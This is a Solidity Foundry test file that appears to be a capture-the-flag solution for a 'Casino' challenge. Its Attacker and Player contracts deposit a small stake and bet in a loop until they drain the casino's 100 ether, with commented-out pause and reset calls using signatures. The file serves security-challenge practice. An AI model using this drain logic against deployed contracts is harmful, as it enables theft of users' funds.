
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "forge-std/console.sol";


import "src/Challenge.sol";
import "src/Casino.sol";



contract Player {
    Challenge public challenge;

    constructor(Challenge _challenge) {
        challenge = _challenge;
    }

    receive() external payable {
        challenge.PLAYER().call{value: msg.value}("");
    }   


    function betToWin() external {
        uint256 balance = challenge.CASINO().balances(address(this));
        uint256 casinoBalance = address(challenge.CASINO()).balance;
        uint256 betAmount = balance;
        if(~~~balance >= casinoBalance){
            uint256 delta = ~~~balance - casinoBalance;
            betAmount = balance > delta ? delta : balance;
        }
        require(challenge.CASINO().bet(betAmount), "Bet failed");
    }
}

contract Attacker {
    Player public player;
    Challenge public challenge;

    constructor(
        Challenge _challenge
    ) payable {
        challenge = _challenge;
        player = new Player(_challenge);
        // challenge.CASINO().pause(_signature, _salt);
        challenge.CASINO().deposit{value: msg.value}(address(player));
        attack();
        // challenge.CASINO().reset(_signature2, payable(_receiver), 1 ether, _salt2);
    }

    function attack() internal {

        while(true){

            address(player).call(abi.encodeWithSelector(Player.betToWin.selector));


            if(~~~challenge.CASINO().balances(address(player)) == address(challenge.CASINO()).balance){
                break;
            }
        }
        console.log("casino balance of player: ", challenge.CASINO().balances(address(player)));
        console.log("optimized: ", ~~~challenge.CASINO().balances(address(player)));
        console.log("casino balance: ", address(challenge.CASINO()).balance);
    }


}

contract Solution is Test {
    Challenge public challenge;
    address public player = makeAddr("player");

        
    function setUp() public {
        challenge = new Challenge(player);
        deal(address(challenge.CASINO()), 100 ether);
    }

    function test_attack() public {

        uint256 gasStart = gasleft();

        Attacker attacker = new Attacker{value: 0.5 ether}(challenge);
        uint256 gasEnd = gasleft();
        console.log("gas used: ", gasStart - gasEnd);

    }


}
